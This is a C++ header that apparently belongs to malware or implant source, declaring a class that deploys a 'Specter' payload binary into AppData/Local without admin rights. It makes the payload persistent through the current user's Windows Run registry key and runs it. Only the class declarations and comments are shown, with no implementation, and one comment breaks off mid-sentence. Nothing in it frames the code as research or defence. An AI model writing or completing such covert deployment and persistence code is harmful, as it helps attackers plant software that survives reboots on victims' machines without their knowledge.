#pragma once
#include <filesystem>
#include <string>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <winreg/WinReg.hpp>

// This class is responsible for deploying the Specter binary into the machine without any admin privileges
// Deploy to the AppData/Local folder, and ensures persistence by using the HKCU persistence method and 
class SpecterBasicDeployment
{
	static constexpr HKEY kTargetRegistryRoot = HKEY_CURRENT_USER;
	static inline const std::wstring kTargetRegistry = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	std::wstring m_program_name;
	std::filesystem::path m_target_file;
	winreg::RegKey m_reg_key;

public:
	SpecterBasicDeployment(const SpecterBasicDeployment& other) = delete;
	SpecterBasicDeployment& operator=(const SpecterBasicDeployment& other) = delete;

	SpecterBasicDeployment(std::wstring program_name, const std::wstring& target_file_name);

	bool IsInstalled() const;

	// Deploys the payload to the current machine, modifies the registry to ensure startup as user
	bool Install();

private:
	bool IsPersistent() const;

	bool IsDeployedOnFilesystem() const;

	bool DeployBinary() const;

	bool EnablePersistence();

	void DisablePersistence();

	void RunBinary() const;
};
